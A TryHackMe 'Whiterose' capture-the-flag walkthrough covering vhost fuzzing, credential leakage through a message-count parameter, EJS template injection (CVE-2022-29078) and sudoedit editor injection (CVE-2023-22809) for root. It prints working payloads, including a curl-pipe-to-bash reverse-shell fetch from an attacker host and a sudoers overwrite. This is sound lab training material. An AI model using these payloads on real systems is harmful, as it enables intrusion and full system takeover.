---
title: "TryHackMe Whiterose — Walkthrough"
date: 2026-01-24 08:00:00 +0300
categories: [TryHackMe, Web]
tags: [vhost, ssti, ejs, cve-2022-29078, cve-2023-22809, sudoedit]
pin: false
---

Whiterose begins with **vhost discovery** on a Cyprus bank portal, escalates from provided credentials to **admin Gayle Bev**, exploits **EJS SSTI (CVE-2022-29078)** for **`web`**, then **CVE-2023-22809** on **`sudoedit`** for root.

## Initial Enumeration

### Nmap scan

```bash
nmap -T4 -n -sC -sV -Pn -p- <TARGET_IP>
```

| Port | Service |
| ---- | ------- |
| 22 | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 |
| 80 | nginx 1.14.0 (Ubuntu) |

### Web 80

`http://<TARGET_IP>/` redirects to **`http://cyprusbank.thm/`** — add to `/etc/hosts`:

```text
<TARGET_IP> cyprusbank.thm
```

Root vhost shows only a maintenance page. Directory fuzzing finds little on the apex host.

### Vhost enumeration

```bash
ffuf -u 'http://cyprusbank.thm/' \
  -H "Host: FUZZ.cyprusbank.thm" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -mc all -t 100 -ic -fw 1
```

Hits:

| Subdomain | Status | Notes |
| --------- | ------ | ----- |
| `www` | 200 | Same maintenance content as apex |
| `admin` | 302 | Redirects to `/login` |

Hosts file:

```text
<TARGET_IP> cyprusbank.thm www.cyprusbank.thm admin.cyprusbank.thm
```

## Shell as web

### Access as Olivia Cortez

Room credentials **`Olivia Cortez:olivi8`** authenticate at **`http://admin.cyprusbank.thm/login`**.

Post-login: transactions/accounts visible; **phone numbers hidden**. Top navigation unlocks **Search**, **Messages**, **Settings** (settings denied for this user).

**Search** — customer lookup by name.

**Messages** — default URL `http://admin.cyprusbank.thm/messages/?c=5` shows five chat lines; older messages roll off when new ones arrive.

Hypothesis: **`c`** controls message count. Requesting **`?c=10`** reveals archived messages, including **`Gayle Bev`** credentials.

### EJS SSTI

Log out, log in as **`Gayle Bev`**. Phone numbers visible; **Settings** at `/settings` now accessible.

Password-change form reflects new passwords. **`name`** / **`password`** alone show no SQLi/SSTI.

POST parameter fuzz:

```bash
ffuf -u 'http://admin.cyprusbank.thm/settings' -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: connect.sid=...' \
  -d 'name=test&password=test&FUZZ=test' \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt \
  -t 100 -fs 2098
```

Interesting parameters: **`include`**, **`client`**, **`async`**, **`error`**, **`message`**.

`include` / `client` trigger **500** with EJS stack trace referencing **`settings.ejs`** and **`include is not a function`**. **`async`** returns `{}`.

Conclusion: user input reaches **`render()`** options/data — classic **SSTI** surface with **EJS**.

**Delimiter** option test leaks template source when set to a string absent from the template.

**CVE-2022-29078**: bypass option restrictions via:

```text
settings[view options][outputFunctionName]=...
```

PoC callback:

```text
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl <ATTACKER_IP>');s
```

Serve reverse shell in **`index.html`**, then:

```text
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl <ATTACKER_IP>|bash');s
```

Catch **`web`** on port **443**:

```bash
web@cyprusbank:~/app$ wc -c /home/web/user.txt
35 /home/web/user.txt
```

## Shell as root

### CVE-2023-22809

```bash
web@cyprusbank:~/app$ sudo -l
User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

**sudo** version **1.9.12p1** — vulnerable to **CVE-2023-22809**.

`sudoedit` honors **`EDITOR`/`VISUAL`/`SUDO_EDITOR`**. Embedding **`--`** in the editor value forces opening paths outside the allowed target:

```bash
export EDITOR="nano -- /etc/sudoers"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Add line:

```text
web ALL=(ALL) NOPASSWD: ALL
```

```bash
sudo su -
root@cyprusbank:~# wc -c /root/root.txt
21 /root/root.txt
```

## Takeaways

- **Parameter tampering on chat pagination** (`?c=`) can leak historic secrets.
- **EJS `settings[view options]`** bypass enables full **RCE (CVE-2022-29078)**.
- **`sudoedit` + editor injection (CVE-2023-22809)** rewrites **`/etc/sudoers`** despite path restrictions.
